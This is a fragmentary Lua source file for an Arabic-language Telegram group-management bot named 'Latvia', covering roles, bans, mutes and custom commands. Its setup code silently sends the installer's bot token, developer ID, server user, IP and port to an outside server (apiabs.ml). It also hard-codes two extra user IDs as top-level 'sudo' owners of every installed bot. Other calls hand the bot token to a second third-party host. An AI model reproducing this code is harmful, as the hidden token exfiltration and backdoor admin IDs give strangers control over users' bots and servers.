...
if not DevRio:get(Server.."IdLatvia") then 
...
DevRio:set(Server.."IdLatvia",DevId) 
end ---ifok
else 
...
if not DevRio:get(Server.."TokenLatvia") then 
...
DevRio:set(Server.."TokenLatvia",TokenBot) 
end  
else 
...
Config = {
DevId = DevRio:get(Server.."IdLatvia"),
TokenBot = DevRio:get(Server.."TokenLatvia"),
Latvia = DevRio:get(Server.."TokenLatvia"):match("(%d+)"),
SudoIds = {DevRio:get(Server.."IdLatvia")},
}
Create(Config, "./config.lua") 
https.request("https://apiabs.ml/Api/Latvia/index.php?Get=Latvia&DevId="..DevRio:get(Server.."IdLatvia").."&TokenBot="..DevRio:get(Server.."TokenLatvia").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
file = io.open("Latvia.sh", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Latvia
token="]]..DevRio:get(Server.."TokenLatvia")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
...
f:close() 
DevRio:del(Server.."IdLatvia");DevRio:del(Server.."TokenLatvia")
end 
...
DevId = Config.DevId
SudoIds = {Config.SudoIds,1558668590,775849978}
Latvia = Config.Latvia
TokenBot = Config.TokenBot
NameBot = (DevRio:get(Latvia..'Rio:NameBot') or 'لاتفيا')
--     Source Latvia     --
...
local Status = DevRio:sismember(Latvia..'Rio:RioSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:SecondSudo:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:SudoBot:',msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:RioConstructor:'..msg.chat_id_,msg.sender_user_id_) 
if Status or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
----   Owner   ----
function Owner(msg) 
local Status = DevRio:sismember(Latvia..'Rio:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:Managers:'..msg.chat_id_,msg.sender_user_id_) 
...
----------  Admin  ---------
function Admin(msg) 
local Status = DevRio:sismember(Latvia..'Rio:Admins:'..msg.chat_id_,msg.sender_user_id_) 
...
---------Vip Member---------
function VipMem(msg) 
local Status = DevRio:sismember(Latvia..'Rio:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevRio:sismember(Latvia..'Rio:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or RioConstructor(msg) or RioSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
if DevRio:sismember(Latvia..'Rio:Ban:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Latvia..'Rio:BanAll:', user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Latvia..'Rio:Muted:'..chat_id, user_id) then
var = true
else
var = false
end
...
if DevRio:sismember(Latvia..'Rio:MuteAll:', user_id) then
var = true
else
var = false
end
...
if File_Name ~= "Latvia.lua" then 
send(chat,msg.id_," ᥀︙هذا الملف ليس تابع لسورس لاتفيا")
return false 
end      
...
vardump(JsonInfo)
DevRio:set(Latvia.."Rio:NameBot",JsonInfo.BotName) 
for IdGps,v in pairs(JsonInfo.GroupsList) do
DevRio:sadd(Latvia.."Rio:Groups",IdGps) 
DevRio:set(Latvia.."Rio:Lock:Bots"..IdGps,"del") DevRio:hset(Latvia.."Rio:Spam:Group:User"..IdGps ,"Spam:User","keed") 
...
DevRio:set(Latvia..Lock..IdGps,true)
end
if v.RioConstructors then
for k,IdRioConstructors in pairs(v.RioConstructors) do
DevRio:sadd(Latvia..'Rio:RioConstructor:'..IdGps,IdRioConstructors)  
print('تم رفع منشئين المجموعات')
end
end
if v.BasicConstructors then
for k,IdBasicConstructors in pairs(v.BasicConstructors) do
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..IdGps,IdBasicConstructors)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.Constructors then
for k,IdConstructors in pairs(v.Constructors) do
DevRio:sadd(Latvia..'Rio:Constructor:'..IdGps,IdConstructors)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Managers then
for k,IdManagers in pairs(v.Managers) do
DevRio:sadd(Latvia..'Rio:Managers:'..IdGps,IdManagers)  
...
vardump(IdAdmins)
DevRio:sadd(Latvia..'Rio:Admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevRio:sadd(Latvia..'Rio:VipMem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevRio:set(Latvia.."Rio:Groups:Links"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevRio:set(Latvia.."Rio:Groups:Welcomes"..IdGps,v.Welcomes)   
...
--     Source Latvia     --
local RioRank = function(msg) if SudoId(msg.sender_user_id_) then LatviaTeam  = "المطور" elseif RioSudo(msg) then LatviaTeam = "المطور" elseif SecondSudo(msg) then LatviaTeam = "المطور" elseif SudoBot(msg) then LatviaTeam = "المطور" elseif Manager(msg) then LatviaTeam = "المدير" elseif Admin(msg) then LatviaTeam = "الادمن" else LatviaTeam = "العضو" end return LatviaTeam end
function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then LatviaTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(775849978) then LatviaTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Latvia) then LatviaTeam = 'البوت' elseif SudoId(user_id) then LatviaTeam = 'المطور الاساسي' elseif DevRio:sismember(Latvia..'Rio:RioSudo:', user_id) then LatviaTeam = 'المطور الاساسي' elseif DevRio:sismember(Latvia..'Rio:SecondSudo:', user_id) then LatviaTeam = 'المطور الاساسي²' elseif DevRio:sismember(Latvia..'Rio:SudoBot:', user_id) then LatviaTeam = DevRio:get(Latvia.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(Latvia..'Rio:RioConstructor:'..chat_id, user_id) then LatviaTeam = 'المالك' elseif DevRio:sismember(Latvia..'Rio:Owner:', user_id) then LatviaTeam = 'المالك' elseif DevRio:sismember(Latvia..'Rio:BasicConstructor:'..chat_id, user_id) then LatviaTeam = DevRio:get(Latvia.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(Latvia..'Rio:Constructor:'..chat_id, user_id) then LatviaTeam = DevRio:get(Latvia.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(Latvia..'Rio:Managers:'..chat_id, user_id) then LatviaTeam = DevRio:get(Latvia.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(Latvia..'Rio:Admins:'..chat_id, user_id) then LatviaTeam = DevRio:get(Latvia.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(Latvia..'Rio:VipMem:'..chat_id, user_id) then  LatviaTeam = DevRio:get(Latvia.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(Latvia..'Rio:Cleaner:'..chat_id, user_id) then  LatviaTeam = DevRio:get(Latvia.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else LatviaTeam = DevRio:get(Latvia.."Rio:mem:Rd"..chat_id) or 'العضو' end return LatviaTeam end
--     Source Latvia     --
...
var = true
elseif DevRio:sismember(Latvia..'Rio:RioSudo:', user_id) then
var = true
elseif DevRio:sismember(Latvia..'Rio:SecondSudo:', user_id) then
var = true  
elseif DevRio:sismember(Latvia..'Rio:SudoBot:', user_id) then
var = true 
elseif DevRio:sismember(Latvia..'Rio:RioConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Latvia..'Rio:Owner:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Latvia..'Rio:BasicConstructor:'..chat_id, user_id) then
var = true
elseif DevRio:sismember(Latvia..'Rio:Constructor:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Latvia..'Rio:Managers:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Latvia..'Rio:Admins:'..chat_id, user_id) then
var = true  
elseif DevRio:sismember(Latvia..'Rio:VipMem:'..chat_id, user_id) then  
var = true 
else  
var = false
end  
...
local rio = (Latvia..'Rio:Filters:'..msg.chat_id_)
if rio then
...
--     Source Latvia     --
function riomoned(chat_id, user_id, msg_id, text, offset, length) local tt = DevRio:get(Latvia..'endmsg') or '' tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = msg_id, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text..'\n\n'..tt, disable_web_page_preview_ = 1, clear_draft_ = 0, entities_ = {[0]={ ID="MessageEntityMentionName", offset_=offset, length_=length, user_id_=user_id }, }, }, }, dl_cb, nil) end
--     Source Latvia     --
function ChCheck(msg)
local var = true 
if DevRio:get(Latvia.."Rio:ChId") then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getchatmember?chat_id='..DevRio:get(Latvia..'Rio:ChId')..'&user_id='..msg.sender_user_id_)
local data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false 
if DevRio:get(Latvia..'Rio:ChText') then
local ChText = DevRio:get(Latvia..'Rio:ChText')
send(msg.chat_id_,msg.id_,'['..ChText..']')
else
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevRio:get(Latvia.."Rio:ChId"))
local GetInfo = JSON.decode(Check)
...
if DataText == '/delyes' and DevRio:get(Latvia..'yes'..data.sender_user_id_) == 'delyes' then
DevRio:del(Latvia..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Latvia..'no'..data.sender_user_id_, 'delno')
...
if DataText == '/delno' and DevRio:get(Latvia..'no'..data.sender_user_id_) == 'delno' then
DevRio:del(Latvia..'yes'..data.sender_user_id_, 'delyes')
DevRio:del(Latvia..'no'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر اطردني") 
end
--     Source Latvia     --
if DataText == '/yesdel' and DevRio:get(Latvia..'yesdel'..data.sender_user_id_) == 'delyes' then
DevRio:del(Latvia..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Latvia..'nodel'..data.sender_user_id_, 'delno')
if DevRio:sismember(Latvia..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Latvia..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) then
Managers = 'المدراء • ' else Managers = '' end
if DevRio:sismember(Latvia..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Latvia..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Latvia..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = '' end
if DevRio:sismember(Latvia..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
donky = 'المطايه • ' else donky = '' end
if DevRio:sismember(Latvia..'Rio:Constructor:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Latvia..'Rio:Managers:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Latvia..'Rio:Admins:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Latvia..'Rio:VipMem:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Latvia..'Rio:Cleaner:'..data.chat_id_, data.sender_user_id_) or DevRio:sismember(Latvia..'User:Donky:'..data.chat_id_, data.sender_user_id_) then
DevRio:srem(Latvia..'Rio:Constructor:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Latvia..'Rio:Managers:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Latvia..'Rio:Admins:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Latvia..'Rio:VipMem:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Latvia..'Rio:Cleaner:'..data.chat_id_,data.sender_user_id_)
DevRio:srem(Latvia..'User:Donky:'..data.chat_id_,data.sender_user_id_)
...
if DevRio:get(Latvia.."Rio:NewDev"..data.sender_user_id_) then
if DataText == '/setno' then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر تغير المطور الاساسي") 
DevRio:del(Latvia.."Rio:NewDev"..data.sender_user_id_)
return false
end
if DataText == '/setyes' then
local NewDev = DevRio:get(Latvia.."Rio:NewDev"..data.sender_user_id_)
...
if DataText == '/nodel' and DevRio:get(Latvia..'nodel'..data.sender_user_id_) == 'delno' then
DevRio:del(Latvia..'yesdel'..data.sender_user_id_, 'delyes')
DevRio:del(Latvia..'nodel'..data.sender_user_id_, 'delno')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم الغاء امر نزلني") 
end
if DataText == '/YesRolet' and DevRio:get(Latvia.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_) then
local List = DevRio:smembers(Latvia..'Rio:ListRolet'..data.chat_id_) 
local UserName = List[math.random(#List)]
tdcli_function ({ID="SearchPublicChat",username_ = UserName},function(arg,dp) 
DevRio:incrby(Latvia..'Rio:GamesNumber'..data.chat_id_..dp.id_, 5) 
end,nil) 
DevRio:del(Latvia..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Latvia.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
EditMsg(Chat_Id2, Msg_Id2, "᥀︙*صاحب الحظ* ↫ ["..UserName.."]\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*")
end
if DataText == '/NoRolet' then
DevRio:del(Latvia..'Rio:ListRolet'..data.chat_id_) 
DevRio:del(Latvia.."Rio:NumRolet"..data.chat_id_..data.sender_user_id_) 
DevRio:del(Latvia.."Rio:WittingStartRolet"..data.chat_id_..data.sender_user_id_)
...
if DevRio:sismember(Latvia..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_) then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..Chat_Id2.."&user_id="..data.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Latvia..'Rio:Tkeed:'..Chat_Id2, data.sender_user_id_)
...
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://api-david.ml/Latvia/DavidYt.php?Put=Photo&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&UserId='..data.sender_user_id_..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://api-david.ml/Latvia/DavidYt.php?Put=Video&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
https.request('https://api-david.ml/Latvia/DavidYt.php?Put=Audio&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
...
https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ جار تحميل النتائج يرجى الانتظار .. .")..'&show_alert=true')
DeleteMessage(Chat_Id2,{[0] = MsgId2})
https.request('https://api-david.ml/Latvia/DavidYt.php?Put=Voice&TokenBot='..TokenBot..'&ChatId='..Chat_Id2..'&MsgId='..Msg_Id2..'&Url='..Url..'&Name='..DirName)
end
if DataText and DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/DelRed:'..tonumber(data.sender_user_id_)..'(.*)')
EditMsg(Chat_Id2, Msg_Id2, "᥀︙الكلمه ↫ "..Rio.." تم حذفها") 
DevRio:del(Latvia..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevRio:smembers(Latvia..'Rio:Text:GpTexts'..Rio..data.chat_id_)
if DevRio:get(Latvia..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "᥀︙تم انهاء وحفظ ↫ "..#List.." من الردود المتعدده للامر ↫ "..Rio) 
DevRio:del(Latvia..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
else
...
DevRio:del(Latvia..'Rio:Add:GpRedod'..data.sender_user_id_..data.chat_id_)
DevRio:del(Latvia..'Rio:Text:GpTexts'..Rio..data.chat_id_)
DevRio:del(Latvia..'Rio:Add:GpTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Latvia..'Rio:Manager:GpRedod'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "᥀︙عذرا صلاحية الامر منتهيه !") 
end
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Latvia..'Rio:Help')
local Text = [[
...
local Help = DevRio:get(Latvia..'Rio:Help1')
local Text = [[
...
local Help = DevRio:get(Latvia..'Rio:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
...
local Help = DevRio:get(Latvia..'Rio:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
...
local Help = DevRio:get(Latvia..'Rio:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
...
local Help = DevRio:get(Latvia..'Rio:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
...
if tonumber(Rio) == tonumber(data.sender_user_id_) then
local Help = DevRio:get(Latvia..'Rio:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
if text and DevRio:get(Latvia.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevRio:get(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevRio:del(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevRio:del(Latvia.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:srem(Latvia.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevRio:del(Latvia.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevRio:get(Latvia..'Rio:NameBot') or "لاتفيا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevRio:get(Latvia..'Rio:NameBot') or "لاتفيا")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevRio:get(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevRio:get(Latvia.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevRio:set(Latvia.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevRio:del(Latvia.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevRio:set(Latvia.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevRio:get(Latvia.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevRio:get(Latvia.."Set:Cmd:Group:New"..msg.chat_id_)
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevRio:del(Latvia.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevRio:smembers(Latvia.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevRio:get(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevRio:smembers(Latvia.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevRio:del(Latvia.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevRio:set(Latvia.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevRio:sadd(Latvia.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
DevRio:set(Latvia.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevRio:set(Latvia.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevRio:smembers(Latvia.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevRio:get(Latvia.."Comd:New:rt:Rio:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevRio:smembers(Latvia.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevRio:del(Latvia.."Comd:New:rt:Rio:"..v..msg.chat_id_)
DevRio:del(Latvia.."Coomds"..msg.chat_id_)
end
...
DevRio:set(Latvia.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevRio:sadd(Latvia.."Coomds"..msg.chat_id_,ComdNew)  
DevRio:setex(Latvia.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevRio:del(Latvia.."Comd:New:rt:Rio:"..ComdNew..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevRio:get(Latvia.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevRio:del(Latvia.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevRio:get(Latvia.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevRio:set(Latvia.."Comd:New:rt:Rio:"..textn..msg.chat_id_,text)
...
if DevRio:sismember(Latvia.."Coomds"..msg.chat_id_,DEV_RIO) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrrio = DevRio:get(Latvia.."Comd:New:rt:Rio:"..DEV_RIO..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO) 
DevRio:sadd(Latvia..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:set(Latvia.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_RIO)
DevRio:sadd(Latvia..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'latviateam')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
